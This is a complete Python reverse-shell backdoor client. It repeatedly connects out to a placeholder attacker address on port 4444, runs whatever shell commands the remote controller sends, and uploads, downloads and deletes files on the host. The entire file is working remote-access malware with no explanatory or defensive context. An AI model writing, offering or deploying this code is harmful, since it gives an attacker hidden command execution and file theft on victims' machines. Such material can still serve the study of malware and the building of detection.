import socket
import subprocess
import json
import os
import time

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout:
                break
        s.settimeout(None)

def delete_file(file_name):
    try:
        os.remove(file_name)
        return "[+] File deleted successfully"
    except FileNotFoundError:
        return "[-] File not found"
    except Exception as e:
        return f"[-] Error deleting file: {str(e)}"

def connect_to_server():
    while True:
        try:
            s.connect(('YOUR_ACTAUL_IP', 4444))
            break
        except ConnectionRefusedError:
            print("Connection refused, retrying in 5 seconds...")
            time.sleep(5)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect_to_server()

while True:
    command = reliable_recv()
    if command == 'quit':
        break
    elif command[:2] == 'cd':
        os.chdir(command[3:])
    elif command[:8] == 'download':
        upload_file(command[9:])
    elif command[:6] == 'upload':
        download_file(command[7:])
    elif command[:6] == 'delete':
        result = delete_file(command[7:])
        reliable_send(result)
    else:
        result = execute_system_command(command)
        reliable_send(result.decode())

s.close()
